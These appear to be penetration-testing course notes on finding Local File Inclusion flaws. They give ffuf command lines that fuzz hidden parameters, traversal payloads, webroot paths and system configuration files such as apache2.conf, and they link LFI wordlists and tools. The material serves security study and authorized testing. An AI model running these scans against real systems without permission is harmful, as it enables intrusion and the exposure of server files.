# Automated Scanning & Wordlists for LFI Notes

While manual LFI exploitation is crucial for dealing with custom implementations, WAFs, or firewalls, automated tools and comprehensive wordlists can speed up the discovery of trivial vulnerabilities across exposed parameters.

## 1. Fuzzing Parameters

Not all vulnerable parameters are visible on the front end. Hidden or forgotten GET/POST parameters might lack the same security controls as public-facing ones.

* **Strategy:** Fuzz the application for hidden parameters before testing for LFI.
* **Command (Fuzzing GET parameters with ffuf):**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs <size_to_ignore>

```



## 2. LFI Wordlists

Instead of testing traversal depths (`../`) manually, use specialized LFI wordlists that contain hundreds of permutations, bypasses, and known file locations. [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

* **Recommended Wordlist:** [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) (contains a mix of bypasses and common sensitive files).
* **Command (Fuzzing a known parameter):**
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs <size_to_ignore>

```


* *Note:* Always manually verify the results yielded by the fuzzer.

## 3. Fuzzing for Server Files

If you achieve LFI but need more context (like finding the webroot to locate an uploaded web shell, or finding log files for poisoning), you can use wordlists to guess server paths.

### A. Server Webroot

Finding the absolute path to the webroot (e.g., `/var/www/html/`) is vital for executing uploaded files when relative traversal (`../../uploads/`) fails.

* **Wordlists:**
* Linux: `SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt`
* Windows: `SecLists/Discovery/Web-Content/default-web-root-directory-windows.txt`


* **Command (Fuzzing for `index.php` in common webroots):**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <size_to_ignore>

```



### B. Server Logs and Configurations

Configuration files (like `apache2.conf` or `envvars`) often reveal the location of the webroot, log files, or custom environment variables.

* **Wordlists:** [LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) / [LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) (Often found on GitHub, though not strictly in SecLists).
* **Command (Fuzzing for common system/config files):**
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <size_to_ignore>

```


* **Manual Follow-up Example:** If the fuzzer finds `/etc/apache2/apache2.conf`, read it via LFI. If it references a variable like `${APACHE_LOG_DIR}`, read `/etc/apache2/envvars` to find out where that variable points.

## 4. LFI Tools

There are several automated tools designed specifically to exploit LFI, though many are unmaintained or rely on legacy Python 2.

* **Common Tools:** [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak(https://github.com/OsandaMalith/LFiFreak), [liffy](https://github.com/mzfr/liffy).
* *Caveat:* While they automate the process, they often lack the nuance required for modern, secure environments and may miss files that a precise manual fuzzing approach would catch.
